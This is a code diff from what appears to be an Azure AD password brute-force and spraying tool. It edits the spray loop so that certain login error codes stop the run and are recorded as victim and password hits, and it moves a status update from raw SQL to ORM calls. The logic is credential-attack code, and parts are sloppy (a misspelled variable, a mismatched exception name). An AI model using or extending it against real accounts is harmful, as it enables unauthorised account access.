@@ -2,6 +2,7 @@
 
 import adal
 from sqlalchemy.sql.expression import false, true
+from vajra.models import AttackStatus
 from vajra import db
 from sqlalchemy.sql import text
 from vajra.models import bruteforceConfig, bruteforceLogs, bruteforceResult
@@ -30,22 +31,19 @@ class bruteforceAttack():
                     error_code = e.error_response['error_codes'][0]
                     error_description = e.error_response['error_description'].split(": ")[1]
                     message = error_description.split("\n")[0]
-                    #errorLog = f"<span style=\"color:red\"><br><br>Username: {victim} <br>Password: {password} <br> Message: {message}<br></span>"
-                    #db.session.add(bruteforceLogs(uuid=uuid, message=errorLog))
                     if error_code != 50126:
                         errorLog = f"<span style=\"color:red\"><br><br>Username: {victim} <br>Password: {password} <br> Message: {message}<br></span>"
                         db.session.add(bruteforceLogs(uuid=uuid, message=errorLog))
                         res = bruteforceResult(uuid=uuid, victim=victim, password=password, errorCode=error_code, message=message, endpoint=endpoint)
                         db.session.add(res)
+                        return true
 
                     db.session.commit()    
-                    return true
+                    return false
+
                 except TypeError as f:
-                    result = str(e)
                     print(e)
                 
-                
-
             if sccuess == true:
                 pass
                 
@@ -69,12 +67,13 @@ class bruteforceAttack():
             db.session.query(bruteforceResult).filter_by(uuid=uuid, victim=victim).delete()
             
             for password in passwords:
-                password = password.passwords
+                password = password.passwords                
                 message = f"<br><span style=\"color:yellow\">[!] {victim} : {password} </span>" 
                 db.session.add(bruteforceLogs(uuid=uuid, message=message))
                 db.session.commit()
                 res = bruteforceAttack.spray(uuid, password, endpoints, victim)
                 if res == true:
                     break
-                
-        db.engine.execute(text("UPDATE attack_status SET bruteforce ='False' WHERE uuid = :uuid"), uuid=uuid)
+        status = AttackStatus.query.filter_by(uuid=uuid).first()
+        status.bruteforce = "False"
+        db.session.commit()
